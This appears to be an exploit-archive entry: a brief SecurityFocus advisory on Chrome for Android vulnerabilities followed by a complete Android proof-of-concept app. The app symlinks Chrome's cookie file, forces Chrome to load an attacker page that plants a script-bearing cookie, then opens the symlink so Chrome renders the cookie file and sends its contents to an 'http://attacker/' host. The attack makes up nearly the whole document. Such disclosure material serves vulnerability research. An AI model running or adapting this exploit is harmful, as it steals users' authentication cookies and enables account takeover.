@@ -1,0 +1,87 @@
+source: http://www.securityfocus.com/bid/55523/info
+  
+Google Chrome for Android is prone to multiple vulnerabilities.
+  
+Attackers may exploit these issues to execute arbitrary code in the context of the browser, obtain potentially sensitive information, bypass the same-origin policy, and steal cookie-based authentication credentials; other attacks are also possible.
+  
+Versions prior to Chrome for Android 18.0.1025308 are vulnerable. 
+
+package jp.mbsd.terada.attackchrome1;
+  
+  import android.app.Activity;
+  import android.os.Bundle;
+  import android.util.Log;
+  import android.content.Intent;
+  import android.net.Uri;
+  
+  public class Main extends Activity {
+    // TAG for logging.
+    public final static String TAG = "attackchrome1";
+  
+    // Cookie file path of Chrome.
+    public final static String CHROME_COOKIE_FILE_PATH =
+      "/data/data/com.android.chrome/app_chrome/Default/Cookies";
+  
+    // Temporaly directory in which the symlink will be created.
+    public final static String MY_TMP_DIR =
+      "/data/data/jp.mbsd.terada.attackchrome1/tmp/";
+  
+    // The path of the Symlink (must have "html" extension)
+    public final static String LINK_PATH = MY_TMP_DIR + "cookie.html";
+  
+    @Override
+    public void onCreate(Bundle savedInstanceState) {
+      super.onCreate(savedInstanceState);
+      setContentView(R.layout.main);
+      doit();
+    }
+  
+    // Method to invoke Chrome.
+    public void invokeChrome(String url) {
+      Intent intent = new Intent("android.intent.action.VIEW");
+      intent.setClassName("com.android.chrome", "com.google.android.apps.chrome.Main");
+      intent.setData(Uri.parse(url));
+      startActivity(intent);
+    }
+  
+    // Method to execute OS command.
+    public void cmdexec(String[] cmd) {
+      try {
+        Runtime.getRuntime().exec(cmd);
+      }
+      catch (Exception e) {
+        Log.e(TAG, e.getMessage());
+      }
+    }
+  
+    // Main method.
+    public void doit() {
+      try {
+        // Create the symlink in this app's temporary directory.
+        // The symlink points to Chrome's Cookie file.
+        cmdexec(new String[] {"/system/bin/mkdir", MY_TMP_DIR});
+        cmdexec(new String[] {"/system/bin/ln", "-s", CHROME_COOKIE_FILE_PATH, LINK_PATH});
+        cmdexec(new String[] {"/system/bin/chmod", "-R", "777", MY_TMP_DIR});
+  
+        Thread.sleep(1000);
+  
+        // Force Chrome to load attacker's web page to poison Chrome's Cookie file.
+        // Suppose the web page sets a Cookie as below.
+        //   x=<img><script>document.images[0].src='http://attacker/?'
+        //     +encodeURIComponent(document.body.innerHTML)</script>;
+        //     expires=Tue, 01-Jan-2030 00:00:00 GMT
+        String url1 = "http://attacker/set_malicious_cookie.php";
+        invokeChrome(url1);
+  
+        Thread.sleep(10000);
+  
+        // Force Chrome to load the symlink.
+        // Chrome renders the content of the Cookie file as HTML.
+        String url2 = "file://" + LINK_PATH;
+        invokeChrome(url2);
+      }
+      catch (Exception e) {
+        Log.e(TAG, e.getMessage());
+      }
+    }
+  }
